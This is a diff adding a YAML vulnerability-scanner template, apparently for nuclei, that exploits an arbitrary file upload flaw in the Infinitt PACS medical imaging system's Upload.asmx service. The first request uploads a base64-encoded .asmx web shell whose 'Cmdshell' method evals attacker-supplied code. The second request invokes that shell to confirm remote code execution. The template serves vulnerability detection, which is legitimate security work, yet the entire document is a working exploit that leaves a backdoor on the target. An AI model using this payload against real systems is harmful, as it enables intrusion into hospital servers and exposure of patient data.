@@ -1,0 +1,56 @@
+id: poc-yaml-infinitt-upload-anyfile-upload
+info:
+  name: Infinitt PACS Upload.asmx Arbitrary File Upload Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: file-upload
+  description: |
+    The Infinitt PACS system is vulnerable to an arbitrary file upload vulnerability via the Upload.asmx endpoint.
+variables:
+  t1: "{{rand_base(4)}}"
+  t2: "{{base64(t1)}}"
+flow: http(1) && http(2)
+http:
+  - id: step-1-upload
+    method: POST
+    path:
+      - "{{BaseURL}}/webservices/Upload.asmx"
+    headers:
+      Content-Type: text/xml; charset=utf-8
+      SOAPAction: "http://tempuri.org/UploadData"
+    body: |-
+      <?xml version="1.0" encoding="utf-8"?>
+      <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+      <soap:Body>
+      <UploadData xmlns="http://tempuri.org/">
+      <guid>1</guid>
+      <patientId>1</patientId>
+      <patientName>1</patientName>
+      <fileName>{{t1}}.asmx</fileName>
+      <fileSize>1000</fileSize>
+      <file>PCVAIFdlYlNlcnZpY2UgTGFuZ3VhZ2U9IkpTY3JpcHQiIENsYXNzPSJXZWJTZXJ2aWNlMSIgJT4KIAppbXBvcnQgU3lzdGVtO2ltcG9ydCBTeXN0ZW0uV2ViO2ltcG9ydCBTeXN0ZW0uSU87aW1wb3J0IFN5c3RlbS5XZWIuU2VydmljZXM7CmltcG9ydCBTeXN0ZW0uV2ViOwogCnB1YmxpYyBjbGFzcyBXZWJTZXJ2aWNlMSBleHRlbmRzIFdlYlNlcnZpY2UKewogCldlYk1ldGhvZEF0dHJpYnV0ZSBTY3JpcHRNZXRob2RBdHRyaWJ1dGUgZnVuY3Rpb24gQ21kc2hlbGwoUGFzcyA6IFN0cmluZykgOiBWb2lkCiAgICB7CiAgICAgICAgICAgIHZhciBjID0gSHR0cENvbnRleHQuQ3VycmVudDsKICAgICAgICAgICAgdmFyIFJlcXVlc3QgPSBjLlJlcXVlc3Q7CiAgICAgICAgICAgIHZhciBSZXNwb25zZSA9IGMuUmVzcG9uc2U7CiAgICAgICAgICAgIGV2YWwoUGFzcyk7CiAgICB9Cn0=</file>
+      </UploadData>
+      </soap:Body>
+      </soap:Envelope>
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "UploadResponse"
+  - id: step-2-verify
+    method: GET
+    path:
+      - "{{BaseURL}}/spool/1/{{t1}}.asmx/Cmdshell?Pass=Response.Write(\"{{t2}}\")"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "{{t2}}"
